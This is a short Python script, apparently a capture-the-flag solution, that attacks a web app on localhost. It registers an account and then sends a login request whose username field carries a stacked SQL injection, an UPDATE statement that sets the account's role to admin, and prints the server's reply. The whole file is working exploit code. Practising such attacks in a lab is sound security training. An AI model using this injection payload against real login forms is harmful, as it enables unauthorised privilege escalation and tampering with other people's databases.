#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8080"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    register_payload = {"username":"group166","password":"Super_Secure_INFOSEC21_!?"}

    requests.post(url + "/register",data=register_payload)

    login_payload = {"username":"group166'; UPDATE user SET role = 'admin' WHERE username = 'group166","password":"Super_Secure_INFOSEC21_!?"}

    r = requests.post(url + "/login",data=login_payload)

    print(r.text)

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


